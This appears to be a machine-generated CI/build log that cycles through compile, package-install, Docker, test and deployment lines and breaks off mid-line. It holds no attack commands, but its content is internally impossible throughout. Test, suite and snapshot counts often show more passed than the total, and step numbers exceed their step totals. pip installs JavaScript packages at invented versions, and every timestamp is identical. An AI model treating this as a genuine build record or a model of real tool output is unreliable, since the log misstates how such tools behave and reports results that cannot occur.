DEPRECATION: Feature will be removed in v3.0\nCompiling lib/main.py...\npip install: Successfully installed express-4.18\nEnvironment: staging\nCompleted.\nReady.\nPulling image: node:latest\n[12:46:30] DEBUG: Memory usage: 489MB\nArtifact uploaded: build.tar.gz (26MB)\n\u2717 build failed with exit code 11\nCompleted.\nAlready up to date.\nTransforming 798 files...\npip install: Successfully installed eslint-5.15\n[12:46:30] INFO: Request completed\n[12:46:30] INFO: Connecting to database\nCache invalidated: dependencies\nEnvironment: staging\nFAILED: test_api_health\nUsing Python 3.9\nImage pulled successfully\nFetching from https://googleapis.com/package.json\n[12:46:30] DEBUG: Query executed in 43ms\nTransforming 687 files...\nBundling main.css\n\u2713 deploy completed\nGenerating source maps...\nGenerating source maps...\nWaiting...\nPlatform: win32-x64\nCompiling lib/service.java...\nCompiling src/service.java...\nFinished.\nFAILED: test_api_health\nWARNING: axios has known vulnerabilities\n[12:46:30] WARN: Deprecated API usage\n[12:46:30] DEBUG: Query executed in 27ms\nCompiling src/handler.rs...\nWaiting...\nCompiling components/app.ts...\nArtifact uploaded: dist.zip (42MB)\n[12:46:30] DEBUG: Connection pool: 15 active\nCache hit for key-5161\nArtifact uploaded: dist.zip (100MB)\nStep 10/17: Running migrations\n  PASS: test_user_create (391ms)\n[12:46:30] DEBUG: Query executed in 96ms\n  PASS: e2e/test_user_create.spec.js\nStep 10/22: Linting\nTime: 68.411s\nBundling main.css\nArtifact downloaded: 47MB\nUsing Node.js 14.10.5\n[12:46:30] WARN: Deprecated API usage\nStep 12/25: Testing\nBundling styles.js\nStep 5/22: Running migrations\nWARNING: axios has known vulnerabilities\nBundling vendor.css\nSuccess!\nStep 3/17: Running migrations\nCache saved successfully\nStep 13/25: Installing dependencies\nArtifact uploaded: dist.zip (38MB)\nNODE_ENV=test\nnpm install: resolved 259 packages\nGenerating source maps...\nUsing Python 3.11\nGenerating source maps...\n[12:46:30] WARN: Deprecated API usage\nDone.\nTLS handshake completed\n  PASS: integration/test_auth_login.spec.js\n[12:46:30] INFO: Starting build process\nConnection established\npip install: Successfully installed express-5.13\npip: Installing build dependencies...\n[12:46:30] WARN: Deprecated API usage\nStep 12/20: Deploying\n[12:46:30] INFO: Connecting to database\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n  PASS: integration/test_db_connect.spec.js\nStep 17/22: Installing dependencies\nnpm notice: package.json updated\n[12:46:30] WARN: Deprecated API usage\nTLS handshake completed\nBuilding Docker image...\nCompiling lib/app.ts...\n[12:46:30] WARN: Deprecated API usage\nArtifact downloaded: 47MB\nWARNING: webpack has known vulnerabilities\npip: Downloading express-5.3.tar.gz\nCache restored successfully (45MB)\nCache invalidated: build\npip: Installing build dependencies...\nOptimizing 71 modules...\nTime: 118.860s\nStep 1/25: Installing dependencies\nFinished.\nVerifying...\nDone.\nFAILED: test_auth_login\nTest Suites: 30 passed, 28 total\nyarn add: Done in 8.8s\nUsing Python 3.12\nnpm install: added 358 packages\nArtifact uploaded: dist.zip (18MB)\nException: ValueError\nCompleted.\nTime: 54.919s\nLayer 6/15: ENV command\nAlready up to date.\n=== Step setup_node completed ===\n=== Step: unit_tests ===\n  PASS: integration/test_api_health.spec.js\nNODE_ENV=production\nUsing Python 3.12\nGenerating source maps...\nCompiling lib/service.java...\nPlatform: darwin-arm64\nCompleted.\nWaiting...\nReady.\nTime: 62.413s\nGET /api - 201 (94ms)\nCache hit for key-5530\nStep 3/15: Deploying\nFetching from https://pypi.org/package.json\nStep 6/15: Deploying\nCoverage: 78% statements, 85% branches\n[12:46:30] DEBUG: Query executed in 66ms\nImage pulled successfully\nCache hit for key-2571\nSnapshots: 29 passed, 16 total\nTLS handshake completed\nSwitched to branch 'bugfix/task-482'\nOK\nHEAD is now at 9df09a1\nWARNING: express has known vulnerabilities\nHEAD is now at 70aee93\nChecking out master branch\nnpm install: resolved 1343 packages\nFetching from https://googleapis.com/package.json\n[12:46:30] DEBUG: Initializing service\nCache invalidated: build\nVerifying...\nFinished.\nCompiling lib/utils.go...\nCache restored successfully (172MB)\nSnapshots: 2 passed, 49 total\npip install: Successfully installed express-1.12\n[12:46:30] INFO: Starting build process\nCompleted.\nFetching submodules...\nGET /status - 200 (10ms)\n[12:46:30] DEBUG: Initializing service\nArtifact uploaded: build.tar.gz (40MB)\nTests: 107 passed, 125 total\n\u2713 All checks passed\nLayer 1/12: ENV command\nCompleted.\nCreating production build...\npip: Collecting eslint\nInstalling react@2.10.10\nCompiling lib/utils.go...\nFAILED: test_api_health\nStep 5/19: Linting\nCache miss for key-1651\n[12:46:30] INFO: Starting build process\n[12:46:30] DEBUG: Query executed in 96ms\nVerifying...\nVerifying...\nnpm install: resolved 775 packages\n[12:46:30] WARN: Deprecated API usage\n\u2713 Task completed in 1822ms\nUsing Python 3.11\n[12:46:30] ERROR: Connection failed\nConnection established\n\u2713 Task completed in 4669ms\nPlatform: win32-x64\nnpm notice: package.json updated\nStep 4/23: Building\nFetching submodules...\nCompiling src/main.py...\nCompiling components/index.js...\n\u2713 Step 'test' succeeded\nRan 161 tests in 26s\nUsing Python 3.9\npip: Installing build dependencies...\n[12:46:30] ERROR: Connection failed\nPushing to registry...\nImage pulled successfully\n[12:46:30] INFO: Processing request\nnpm install: added 143 packages\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 All checks passed\n[12:46:30] WARN: Deprecated API usage\nnpm install: resolved 398 packages\nCache restored successfully (51MB)\nFetching from https://gcr.io/package.json\nBundling runtime.js\npip: Collecting prettier\nTests: 385 passed, 277 total\nGenerating source maps...\nGET /api - 204 (59ms)\nWARNING: express has known vulnerabilities\nStep 11/21: Deploying\npip install: Successfully installed jest-3.17\nRan 144 tests in 33s\nnpm install: resolved 738 packages\nGenerating source maps...\nBundling runtime.js\n\u2713 Step 'build' succeeded\nOptimizing 21 modules...\nProcessing...\nArtifact downloaded: 33MB\nFAILED: test_db_connect\nPlatform: linux-x64\nStep 16/15: Installing dependencies\nImage pulled successfully\n[12:46:30] DEBUG: Loading configuration\nCompleted.\nArtifact uploaded: build.tar.gz (17MB)\nStep 8/21: Testing\nStep 6/22: Running migrations\nStep 13/19: Testing\nArtifact downloaded: 17MB\n[12:46:30] DEBUG: Initializing service\nCompiling components/utils.go...\nCache invalidated: build\nTLS handshake completed\nTransforming 725 files...\nFAILED: test_auth_login\nNODE_ENV=development\n\u2713 Step 'setup' succeeded\nOK\nAlready up to date.\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (30MB)\nTime: 12.315s\nOptimizing 71 modules...\nPushing to registry...\nMinifying main.js\n  PASS: test_auth_login (182ms)\nImage pulled successfully\nArtifact uploaded: dist.zip (55MB)\nWARNING: webpack has known vulnerabilities\n[12:46:30] INFO: Request completed\nCache saved successfully\nCompiling src/handler.rs...\n[12:46:30] INFO: Starting build process\n[12:46:30] WARN: Deprecated API usage\nWaiting...\n[12:46:30] INFO: Processing request\nFetching submodules...\nTLS handshake completed\nRan 190 tests in 19s\npip install: Successfully installed webpack-5.10\nSwitched to branch 'feature/task-466'\nDone.\nReady.\nnpm notice: created a lockfile\nWARNING: express has known vulnerabilities\nTest Suites: 36 passed, 26 total\nArtifact uploaded: dist.zip (76MB)\nyarn add: Done in 27.84s\n[12:46:30] DEBUG: Loading configuration\nCompleted.\nPlatform: win32-x64\n[12:46:30] WARN: Deprecated API usage\n\u2713 Task completed in 2203ms\nCompiling components/handler.rs...\n\u2713 Step 'setup' succeeded\nNODE_ENV=production\nStep 9/17: Linting\n\u2713 All checks passed\n[12:46:30] DEBUG: Initializing service\nArtifact uploaded: build.tar.gz (30MB)\nUploading artifact 'dist' (41 files)\nStep 12/25: Linting\nSwitched to branch 'hotfix/task-885'\nTLS handshake completed\nGET /health - 204 (44ms)\nWARNING: webpack has known vulnerabilities\npip: Downloading axios-2.0.tar.gz\nCreating production build...\nCompiling src/handler.rs...\n[12:46:30] DEBUG: Query executed in 10ms\nWaiting...\nWARNING: axios has known vulnerabilities\nBuilding Docker image...\nHEAD is now at a8af725\nFetching submodules...\n[12:46:30] INFO: Connecting to database\n[12:46:30] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2717 build failed with exit code 82\npip install: Successfully installed eslint-1.18\nArtifact downloaded: 22MB\nCompiling src/handler.rs...\n[12:46:30] WARN: Deprecated API usage\n[12:46:30] DEBUG: Query executed in 89ms\nRan 190 tests in 45s\nGenerating source maps...\n[12:46:30] WARN: Deprecated API usage\nCreating production build...\npip: Installing build dependencies...\n[12:46:30] DEBUG: Initializing service\nBundling main.css\nPulling image: alpine:18\nTLS handshake completed\nCache invalidated: build\nnpm install: added 214 packages\nCompiling src/utils.go...\nStep 15/20: Running migrations\nLoading...\n\u2713 Task completed in 232ms\nLayer 6/11: COPY command\nCache miss for key-3491\nCache miss for key-3440\nSnapshots: 15 passed, 11 total\nMinifying vendor.js\n[12:46:30] DEBUG: Connection pool: 5 active\nGET /status - 204 (7ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nnpm notice: package.json updated\nNODE_ENV=test\nArtifact uploaded: build.tar.gz (43MB)\nStep 11/16: Deploying\nTests: 86 passed, 68 total\nStep 12/16: Testing\nWARNING: prettier has known vulnerabilities\n\u2717 build failed with exit code 123\nTests: 332 passed, 362 total\nLayer 1/13: RUN command\n[12:46:30] DEBUG: Loading configuration\nWaiting...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nWaiting...\nBuilding Docker image...\n[12:46:30] INFO: Processing request\nCache saved successfully\nTime: 92.21s\n=== Step unit_tests completed ===\n=== Step: install_dependencies ===\nPOST /data - 201 (190ms)\nStep 19/25: Linting\nOK\nWaiting...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nException: ValueError\npip install: Successfully installed lodash-1.1\nnpm notice: created a lockfile\n\u2717 build failed with exit code 5\n\u2713 Task completed in 1559ms\nTLS handshake completed\nCompleted.\nStep 19/23: Installing dependencies\nFetching from https://googleapis.com/package.json\nProcessing...\n[12:46:30] DEBUG: Loading configuration\nPlatform: win32-x64\nnpm install: added 90 packages\npip: Downloading eslint-2.3.tar.gz\n[12:46:30] WARN: Deprecated API usage\n[12:46:30] DEBUG: Query executed in 81ms\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nnpm notice: package.json updated\nCache hit for key-2035\nCompiling lib/utils.go...\nVerifying...\n[12:46:30] DEBUG: Loading configuration\nStep 5/23: Testing\n\u2713 lint completed\nOK\nBuilding Docker image...\nFetching submodules...\nHEAD is now at 06d40b3\nConnection established\nPOST /upload - 200 (232ms)\npip: Downloading lodash-4.2.tar.gz\n  PASS: unit/test_user_create.spec.js\nGenerating source maps...\nCompiling utils/utils.go...\npip install: Successfully installed jest-4.3\nCache restored successfully (238MB)\nStep 4/23: Deploying\nCompiling utils/utils.go...\n\u2713 build completed\nChecking out main branch\npip: Downloading eslint-4.14.tar.gz\n\u2717 build failed with exit code 105\nStep 9/16: Installing dependencies\n[12:46:30] INFO: Starting build process\nnpm notice: package.json updated\nLayer 8/12: RUN command\nRan 153 tests in 5s\nWARNING: prettier has known vulnerabilities\nCache restored successfully (118MB)\npip: Collecting react\n[12:46:30] DEBUG: Loading configuration\nCompleted.\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:46:30] ERROR: Connection failed\nAlready up to date.\n[12:46:30] INFO: Cache refreshed\nGET /health - 201 (24ms)\nMinifying app.js\nBuilding Docker image...\nFetching from https://registry.npmjs.org/package.json\n\u2717 build failed with exit code 126\nVerifying...\n\u2713 lint completed\nCoverage: 80% statements, 66% branches\nSnapshots: 38 passed, 3 total\nUploading artifact 'coverage' (46 files)\nStep 18/22: Installing dependencies\n[12:46:30] INFO: Request completed\nBundling main.js\nPlatform: darwin-arm64\n[12:46:30] INFO: Cache refreshed\n[12:46:30] WARN: Deprecated API usage\nCompiling lib/main.py...\nTLS handshake completed\nStep 16/23: Linting\nUsing Python 3.10\n\u2713 All checks passed\nPulling image: alpine:latest\nWaiting...\nStep 16/18: Running migrations\nCreating production build...\nException: ValueError\nEnvironment: production\nVerifying...\nReady.\nCache hit for key-1455\nOK\nStep 5/25: Testing\nCreating production build...\n  PASS: e2e/test_cache_hit.spec.js\n[12:46:30] WARN: Deprecated API usage\nPOST /api - 202 (337ms)\n\u2713 Task completed in 1320ms\nTest Suites: 32 passed, 11 total\n[12:46:30] WARN: Deprecated API usage\nFetching from https://gcr.io/package.json\n[12:46:30] INFO: Cache refreshed\n[12:46:30] DEBUG: Query executed in 79ms\nRan 115 tests in 25s\n\u2713 build completed\nWaiting...\nnpm notice: package.json updated\nMinifying main.js\nGenerating source maps...\nCoverage: 76% statements, 70% branches\nFetching submodules...\nArtifact downloaded: 31MB\n[12:46:30] INFO: Starting build process\n[12:46:30] DEBUG: Connection pool: 7 active\nFinished.\nPOST /data - 201 (260ms)\nWARNING: lodash has known vulnerabilities\nCompleted.\n[12:46:30] WARN: Deprecated API usage\nException: RuntimeError\n[12:46:30] DEBUG: Connection pool: 15 active\nyarn add: Done in 15.95s\nRan 37 tests in 58s\nOptimizing 35 modules...\nOK\n[12:46:30] DEBUG: Memory usage: 842MB\nPulling image: alpine:18\n[12:46:30] DEBUG: Connection pool: 17 active\nAlready up to date.\nFetching submodules...\nTest Suites: 48 passed, 47 total\npip: Collecting jest\nWARNING: lodash has known vulnerabilities\nConnection established\nTest Suites: 34 passed, 13 total\nTests: 424 passed, 133 total\n  PASS: test_cache_hit (303ms)\nOptimizing 23 modules...\nStep 10/18: Installing dependencies\nPulling image: node:18\nStep 4/25: Installing dependencies\nCache hit for key-6491\n[12:46:30] INFO: Request completed\nOK\nWaiting...\nTests: 493 passed, 446 total\nProcessing...\n\u2713 Task completed in 2275ms\n\u2717 build failed with exit code 86\npip install: Successfully installed prettier-3.17\n[12:46:30] INFO: Request completed\nCompiling components/service.java...\nCompiling src/handler.rs...\nVerifying...\nCache restored successfully (281MB)\nCache hit for key-5420\nLoading...\nFetching submodules...\nSuccess!\nInstalling axios@3.7.6\nTime: 101.620s\n[12:46:30] ERROR: Connection failed\n[12:46:30] DEBUG: Initializing service\nRan 193 tests in 33s\nImage pulled successfully\nHEAD is now at 174da22\nFetching from https://amazonaws.com/package.json\nGET /api - 201 (40ms)\nCache hit for key-5124\n\u2713 Task completed in 2458ms\n[12:46:30] INFO: Cache refreshed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nImage pulled successfully\nFinished.\n[12:46:30] DEBUG: Connection pool: 18 active\nAlready up to date.\nSnapshots: 24 passed, 21 total\nImage pulled successfully\nAlready up to date.\n[12:46:30] DEBUG: Memory usage: 535MB\nStep 19/21: Deploying\nnpm notice: package.json updated\n[12:46:30] INFO: Starting build process\nCreating production build...\nSuccess!\n[12:46:30] INFO: Starting build process\nTests: 440 passed, 354 total\n[12:46:30] ERROR: Connection failed\nCompiling src/app.ts...\nPushing to registry...\nArtifact uploaded: build.tar.gz (46MB)\nArtifact uploaded: dist.zip (37MB)\npip install: Successfully installed eslint-1.15\nChecking out master branch\npip install: Successfully installed lodash-3.10\nCache miss for key-2962\nGET /api - 204 (56ms)\nLayer 4/10: RUN command\n[12:46:30] DEBUG: Loading configuration\nSuccess!\nStep 8/18: Testing\nArtifact uploaded: build.tar.gz (18MB)\nPOST /api - 200 (229ms)\nCompiling lib/service.java...\nFetching submodules...\nCache invalidated: dependencies\nSwitched to branch 'bugfix/task-908'\nFinished.\nCache saved successfully\npip install: Successfully installed express-3.15\nTransforming 356 files...\nArtifact uploaded: dist.zip (11MB)\n[12:46:30] DEBUG: Memory usage: 1709MB\nBuilding Docker image...\n[12:46:30] DEBUG: Memory usage: 900MB\n\u2713 Task completed in 2870ms\nReady.\n[12:46:30] DEBUG: Query executed in 27ms\nVerifying...\nCompiling lib/service.java...\nFetching from https://pypi.org/package.json\n\u2713 Task completed in 1862ms\nUsing Node.js 20.15.9\npip: Collecting express\n\u2717 build failed with exit code 36\npip: Downloading eslint-2.0.tar.gz\nPushing to registry...\n[12:46:30] INFO: Request completed\n=== Step install_dependencies completed ===\n=== Step: upload_artifacts ===\nUsing Node.js 15.19.0\nCache restored successfully (53MB)\nAlready up to date.\nFinished.\n[12:46:30] DEBUG: Initializing service\nTime: 49.621s\nnpm notice: package.json updated\nStep 13/17: Running migrations\n[12:46:30] WARN: Deprecated API usage\n  PASS: test_auth_login (139ms)\nnpm notice: created a lockfile\n[12:46:30] DEBUG: Memory usage: 1191MB\nCompleted.\nNODE_ENV=production\nStep 6/25: Linting\npip: Downloading webpack-3.8.tar.gz\nTests: 326 passed, 189 total\nDone.\npip install: Successfully installed axios-2.6\nStep 3/18: Installing dependencies\nnpm notice: package.json updated\n[12:46:30] DEBUG: Memory usage: 795MB\nBuilding Docker image...\nArtifact uploaded: dist.zip (72MB)\nPOST /api - 201 (77ms)\nPushing to registry...\nProcessing...\nnpm notice: created a lockfile\n  PASS: unit/test_db_connect.spec.js\n[12:46:30] DEBUG: Memory usage: 1283MB\nTest Suites: 7 passed, 34 total\nWARNING: jest has known vulnerabilities\nReady.\nCache hit for key-9178\nLoading...\nRan 177 tests in 33s\npip install: Successfully installed react-2.14\nyarn add: Done in 18.10s\nSuccess!\n[12:46:30] DEBUG: Query executed in 71ms\n[12:46:30] INFO: Request completed\nGET /api - 201 (3ms)\nStep 17/24: Linting\nArtifact uploaded: dist.zip (72MB)\nChecking out main branch\nCompleted.\nSwitched to branch 'hotfix/task-826'\nPulling image: python:latest\nConnection established\nCompiling components/main.py...\nWARNING: lodash has known vulnerabilities\nDone.\nWARNING: jest has known vulnerabilities\n[12:46:30] DEBUG: Loading configuration\nnpm install: added 161 packages\nBuilding Docker image...\nImage pulled successfully\nFetching submodules...\n[12:46:30] INFO: Processing request\nTransforming 592 files...\n[12:46:30] ERROR: Connection failed\nException: RuntimeError\nPlatform: linux-x64\nTime: 4.894s\nCompiling utils/utils.go...\nCache restored successfully (458MB)\nBundling styles.css\nCache hit for key-4310\nArtifact uploaded: dist.zip (27MB)\n[12:46:30] DEBUG: Initializing service\nTest Suites: 27 passed, 21 total\nWaiting...\nLayer 4/11: ENV command\nTest Suites: 40 passed, 40 total\npip: Downloading lodash-4.18.tar.gz\npip: Installing build dependencies...\nFAILED: test_db_connect\nVerifying...\nCompiling utils/service.java...\nFetching from https://amazonaws.com/package.json\nTime: 103.538s\n[12:46:30] INFO: Processing request\n  PASS: unit/test_api_health.spec.js\nProcessing...\nProcessing...\npip: Downloading react-1.19.tar.gz\nVerifying...\nOK\nImage pulled successfully\nBuilding Docker image...\nWaiting...\n  PASS: test_auth_login (458ms)\nCache saved successfully\n[12:46:30] WARN: Deprecated API usage\nCompleted.\nCoverage: 90% statements, 72% branches\n\u2713 lint completed\nStep 5/22: Building\nLoading...\nNODE_ENV=development\n[12:46:30] DEBUG: Connection pool: 18 active\nStep 19/23: Running migrations\n[12:46:30] WARN: Deprecated API usage\nWARNING: prettier has known vulnerabilities\nTLS handshake completed\nCompiling lib/service.java...\nCache miss for key-4053\nChecking out master branch\nWaiting...\n[12:46:30] DEBUG: Query executed in 1ms\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nWARNING: express has known vulnerabilities\nVerifying...\nTransforming 281 files...\nBuilding Docker image...\nSwitched to branch 'hotfix/task-310'\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompleted.\nnpm install: added 467 packages\nSnapshots: 39 passed, 16 total\n[12:46:30] INFO: Starting build process\nCompiling lib/handler.rs...\nnpm notice: package.json updated\n[12:46:30] INFO: Processing request\nPulling image: node:3.11\n\u2717 build failed with exit code 90\nAlready up to date.\nPOST /upload - 201 (421ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nImage pulled successfully\nProcessing...\n[12:46:30] INFO: Connecting to database\nTransforming 255 files...\n\u2713 Step 'checkout' succeeded\nnpm install: resolved 470 packages\nCompleted.\nHEAD is now at 031d0b9\n[12:46:30] INFO: Cache refreshed\nCache restored successfully (355MB)\n[12:46:30] WARN: Deprecated API usage\nCreating production build...\nConnection established\nLoading...\n[12:46:30] WARN: Deprecated API usage\nRan 116 tests in 40s\nCompleted.\nInstalling react@5.9.2\nVerifying...\nCoverage: 99% statements, 99% branches\nPushing to registry...\nCompiling utils/main.py...\nAlready up to date.\nTime: 59.100s\nSuccess!\nReady.\nBundling vendor.js\n\u2713 Task completed in 2313ms\n[12:46:30] ERROR: Connection failed\n[12:46:30] INFO: Cache refreshed\nReady.\nCompiling src/index.js...\nBundling runtime.js\n[12:46:30] INFO: Processing request\npip: Collecting lodash\n\u2713 All checks passed\n[12:46:30] INFO: Processing request\nSuccess!\nRan 72 tests in 11s\nConnection established\nProcessing...\nnpm notice: package.json updated\nTLS handshake completed\nReady.\nTests: 441 passed, 431 total\nWARNING: axios has known vulnerabilities\nStep 8/17: Running migrations\nArtifact downloaded: 44MB\nUsing Node.js 15.3.4\n[12:46:30] DEBUG: Memory usage: 611MB\nCache hit for key-2525\nEnvironment: test\n\u2713 build completed\nStep 1/19: Testing\nUsing Python 3.11\nCompiling components/service.java...\nWaiting...\n[12:46:30] DEBUG: Loading configuration\n\u2713 Task completed in 232ms\nGenerating source maps...\nLoading...\nRan 108 tests in 6s\nAlready up to date.\n\u2713 All checks passed\nTests: 113 passed, 393 total\n[12:46:30] ERROR: Connection failed\nRan 85 tests in 32s\nDone.\nUsing Python 3.10\nArtifact downloaded: 30MB\nCompiling lib/utils.go...\nLoading...\nStep 6/19: Building\nUploading artifact 'build' (6 files)\nRan 63 tests in 17s\nArtifact uploaded: build.tar.gz (4MB)\nnpm install: resolved 920 packages\n\u2717 build failed with exit code 112\nAlready up to date.\nArtifact downloaded: 14MB\nCompleted.\nAlready up to date.\nRan 69 tests in 60s\nArtifact uploaded: dist.zip (42MB)\npip: Downloading lodash-4.20.tar.gz\nConnection established\nDone.\nAlready up to date.\nStep 10/24: Running migrations\nMinifying vendor.js\n[12:46:30] DEBUG: Query executed in 56ms\nAlready up to date.\nGET /status - 201 (39ms)\nException: NullPointerException\nFinished.\n  PASS: e2e/test_cache_hit.spec.js\nLoading...\nTLS handshake completed\nCache saved successfully\npip: Downloading eslint-5.12.tar.gz\n=== Step upload_artifacts completed ===\n=== Step: build ===\nRan 104 tests in 15s\nyarn add: Done in 26.60s\nnpm notice: package.json updated\nConnection established\n[12:46:30] WARN: Deprecated API usage\n  PASS: integration/test_auth_login.spec.js\nCache saved successfully\nChecking out main branch\nChecking out main branch\nGenerating source maps...\nnpm install: resolved 520 packages\n  PASS: test_user_create (25ms)\n[12:46:30] INFO: Processing request\nGenerating source maps...\nEnvironment: development\nCompleted.\nCache miss for key-3488\n  PASS: integration/test_user_create.spec.js\nAlready up to date.\nTransforming 453 files...\nStep 16/17: Linting\n[12:46:30] INFO: Request completed\nnpm install: added 194 packages\n\u2713 All checks passed\nCache invalidated: dependencies\nFetching submodules...\nFAILED: test_api_health\nLayer 9/13: RUN command\n[12:46:30] INFO: Cache refreshed\nCompiling lib/main.py...\nPOST /api - 202 (62ms)\nLayer 2/14: COPY command\nUsing Node.js 16.7.8\n\u2713 Step 'test' succeeded\n[12:46:30] INFO: Starting build process\nCompleted.\nStep 16/15: Building\nCoverage: 91% statements, 96% branches\nArtifact downloaded: 30MB\nUploading artifact 'coverage' (44 files)\nUploading artifact 'build' (38 files)\nCompiling components/main.py...\n[12:46:30] INFO: Connecting to database\nCompiling lib/handler.rs...\nOK\n[12:46:30] DEBUG: Connection pool: 3 active\nGenerating source maps...\nStep 6/19: Building\nArtifact uploaded: dist.zip (69MB)\npip: Downloading eslint-1.20.tar.gz\npip: Installing build dependencies...\nGET /health - 201 (44ms)\nCoverage: 74% statements, 96% branches\npip: Downloading webpack-2.9.tar.gz\n[12:46:30] WARN: Deprecated API usage\n[12:46:30] INFO: Processing request\nWARNING: express has known vulnerabilities\nGenerating source maps...\nTransforming 875 files...\nOptimizing 71 modules...\nWARNING: react has known vulnerabilities\nSwitched to branch 'hotfix/task-992'\nProcessing...\nCompleted.\nCreating production build...\n[12:46:30] DEBUG: Initializing service\nArtifact uploaded: dist.zip (32MB)\nProcessing...\nArtifact uploaded: build.tar.gz (24MB)\nSnapshots: 25 passed, 2 total\nVerifying...\nCache hit for key-2390\nOK\n[12:46:30] WARN: Deprecated API usage\nFAILED: test_user_create\n  PASS: integration/test_api_health.spec.js\n[12:46:30] INFO: Request completed\nStep 10/21: Linting\nCompiling utils/main.py...\n\u2717 build failed with exit code 45\nCache invalidated: node_modules\nCache hit for key-8898\nPushing to registry...\npip: Downloading axios-2.16.tar.gz\npip install: Successfully installed express-2.3\n[12:46:30] DEBUG: Memory usage: 1914MB\npip: Collecting webpack\n[12:46:30] INFO: Cache refreshed\nPlatform: linux-x64\nCoverage: 75% statements, 61% branches\nWARNING: express has known vulnerabilities\nCompiling utils/utils.go...\nVerifying...\nLoading...\nCompiling utils/handler.rs...\nCompleted.\npip install: Successfully installed jest-4.3\nNODE_ENV=development\n[12:46:30] ERROR: Connection failed\npip install: Successfully installed prettier-5.14\nCache invalidated: node_modules\n\u2713 Task completed in 1238ms\nCache miss for key-8111\nFetching from https://pypi.org/package.json\nTime: 60.24s\nCreating production build...\nStep 16/18: Testing\nOptimizing 35 modules...\n[12:46:30] WARN: Deprecated API usage\n  PASS: test_db_connect (12ms)\nPlatform: linux-x64\npip install: Successfully installed express-3.5\nTests: 125 passed, 490 total\nBuilding Docker image...\n[12:46:30] WARN: Deprecated API usage\nStep 19/15: Testing\nProcessing...\n[12:46:30] WARN: Deprecated API usage\nException: TypeError\nWARNING: react has known vulnerabilities\nStep 16/16: Building\nArtifact downloaded: 13MB\npip: Downloading lodash-4.0.tar.gz\nBundling main.css\nTests: 487 passed, 116 total\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:46:30] DEBUG: Query executed in 77ms\nHEAD is now at 53a358b\nPushing to registry...\nNODE_ENV=test\nVerifying...\nStep 19/19: Installing dependencies\nArtifact downloaded: 34MB\nEnvironment: production\n[12:46:30] DEBUG: Connection pool: 3 active\n  PASS: test_user_create (484ms)\nyarn add: Done in 6.70s\npip: Installing build dependencies...\nnpm install: resolved 1941 packages\nnpm install: added 442 packages\n[12:46:30] DEBUG: Initializing service\npip: Installing build dependencies...\n[12:46:30] INFO: Request completed\nHEAD is now at 6989690\nTime: 108.865s\n\u2713 build completed\nCompiling lib/app.ts...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nyarn add: Done in 13.96s\nGET /api - 201 (86ms)\nWARNING: express has known vulnerabilities\n  PASS: e2e/test_auth_login.spec.js\nSnapshots: 31 passed, 44 total\npip: Downloading prettier-5.17.tar.gz\nCache hit for key-5104\nCompiling src/handler.rs...\nRan 86 tests in 29s\nCache invalidated: node_modules\nWARNING: react has known vulnerabilities\nStep 13/22: Testing\nCache saved successfully\n[12:46:30] INFO: Connecting to database\nnpm notice: package.json updated\n[12:46:30] ERROR: Connection failed\nTest Suites: 18 passed, 38 total\nCache miss for key-3168\nUsing Node.js 20.16.0\n[12:46:30] DEBUG: Connection pool: 7 active\nConnection established\n[12:46:30] DEBUG: Query executed in 20ms\nLayer 10/15: ENV command\nPOST /upload - 200 (95ms)\n[12:46:30] INFO: Processing request\nCompleted.\nStep 1/20: Building\nStep 17/16: Building\n[12:46:30] DEBUG: Loading configuration\nProcessing...\nWARNING: eslint has known vulnerabilities\nGenerating source maps...\nFAILED: test_user_create\nCache invalidated: dependencies\nUsing Python 3.10\nBundling vendor.js\nSwitched to branch 'hotfix/task-850'\nyarn add: Done in 5.25s\nStep 17/16: Testing\nPulling image: alpine:latest\n[12:46:30] DEBUG: Connection pool: 3 active\nOptimizing 16 modules...\nReady.\nBuilding Docker image...\nVerifying...\n\u2713 Step 'test' succeeded\nBuilding Docker image...\npip: Collecting react\nCache hit for key-9977\nyarn add: Done in 16.58s\nFAILED: test_db_connect\nWARNING: prettier has known vulnerabilities\n\u2717 build failed with exit code 111\nCache hit for key-9324\nRan 162 tests in 52s\n[12:46:30] WARN: Deprecated API usage\npip: Downloading jest-5.13.tar.gz\nCompiling components/app.ts...\nUploading artifact 'dist' (1 files)\nGET /health - 200 (39ms)\nCompiling components/index.js...\n[12:46:30] INFO: Processing request\nnpm notice: package.json updated\nArtifact downloaded: 19MB\nChecking out main branch\nCache invalidated: node_modules\nArtifact uploaded: build.tar.gz (4MB)\nStep 11/23: Running migrations\nAlready up to date.\nPulling image: node:latest\nyarn add: Done in 24.56s\nArtifact downloaded: 46MB\nBundling runtime.css\nDone.\nCoverage: 100% statements, 91% branches\nOK\nCompiling src/service.java...\nChecking out master branch\nRan 149 tests in 25s\nOK\nSuccess!\n=== Step build completed ===\n=== Step: setup_environment ===\nStep 11/17: Testing\nCache saved successfully\nFetching submodules...\nnpm install: added 339 packages\nInstalling eslint@2.20.6\nFetching submodules...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nPushing to registry...\nCompiling src/utils.go...\nnpm install: added 452 packages\npip: Installing build dependencies...\nBuilding Docker image...\nPulling image: alpine:3.11\npip: Collecting lodash\nReady.\n[12:46:30] DEBUG: Connection pool: 20 active\nnpm install: resolved 1729 packages\nnpm notice: created a lockfile\nUsing Node.js 19.2.1\npip install: Successfully installed lodash-4.10\npip install: Successfully installed webpack-2.12\nStep 18/15: Deploying\n[12:46:30] DEBUG: Loading configuration\n[12:46:30] DEBUG: Connection pool: 3 active\n[12:46:30] INFO: Connecting to database\nLayer 4/9: ENV command\nCache invalidated: build\n[12:46:30] DEBUG: Memory usage: 1387MB\nStep 17/25: Linting\nPOST /data - 201 (367ms)\nEnvironment: test\nPlatform: linux-x64\nStep 14/22: Building\nnpm notice: created a lockfile\nCompiling 